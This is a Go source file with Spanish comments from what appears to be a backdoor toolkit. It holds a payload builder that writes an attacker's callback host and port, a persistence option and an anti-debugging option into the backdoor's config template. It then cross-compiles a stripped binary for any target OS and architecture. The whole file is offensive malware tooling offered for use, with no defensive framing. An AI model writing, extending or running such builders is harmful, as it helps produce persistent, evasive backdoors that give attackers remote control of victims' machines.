package builder

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

func BuildPayload(outputPath, targetOS, targetArch, host, port, mode string, enablePersistence, debug bool) error {
	// Asegura que la carpeta destino exista
	if err := os.MkdirAll(filepath.Dir(outputPath), 0755); err != nil {
		return fmt.Errorf(" No se pudo crear carpeta destino: %v", err)
	}

	// Ruta relativa desde builder.go hacia el backdoor
	backdoorDir := filepath.Join("..", "backdoor")
	configTemplatePath := filepath.Join("..", "backdoor", "config", "config.go.tmpl")
	configOutPath := filepath.Join("..", "backdoor", "config", "config.go")

	// Leer plantilla
	template, err := os.ReadFile(configTemplatePath)
	if err != nil {
		return fmt.Errorf(" No se pudo leer la plantilla: %v", err)
	}

	// Reemplazo de variables
	content := string(template)
	content = strings.ReplaceAll(content, "{{HOST}}", host)
	content = strings.ReplaceAll(content, "{{PORT}}", port)
	content = strings.ReplaceAll(content, "{{MODE}}", mode)
	content = strings.ReplaceAll(content, "{{ENABLE_PERSISTENCE}}", fmt.Sprintf("%v", enablePersistence))
	content = strings.ReplaceAll(content, "{{ANTI_DEBUG}}", fmt.Sprintf("%v", debug))

	// Escribir config.go
	err = os.WriteFile(configOutPath, []byte(content), 0644)
	if err != nil {
		return fmt.Errorf(" Error escribiendo config.go: %v", err)
	}

	// Configurar variables de entorno para la compilación''")
	// Ejecutar build
	cmd := exec.Command("go", "build", "-ldflags=-s -w", "-o", outputPath, "main.go")
	cmd.Dir = backdoorDir
	cmd.Env = append(os.Environ(),
		"GOOS="+targetOS,
		"GOARCH="+targetArch,
		"CGO_ENABLED=0",
	)

	out, err := cmd.CombinedOutput()
	fmt.Println("📦 Salida del build:\n", string(out))
	if err != nil {
		return fmt.Errorf(" Falló la compilación:\n%s\nDetalles: %v", string(out), err)
	}

	// Validar el binario
	info, err := os.Stat(outputPath)
	if err != nil {
		return fmt.Errorf(" Binario no encontrado: %v", err)
	}
	if info.Size() < 500_000 {
		return fmt.Errorf(" Binario muy pequeño (%d bytes)", info.Size())
	}

	fmt.Println(" Payload generado en:", outputPath)
	return nil
}
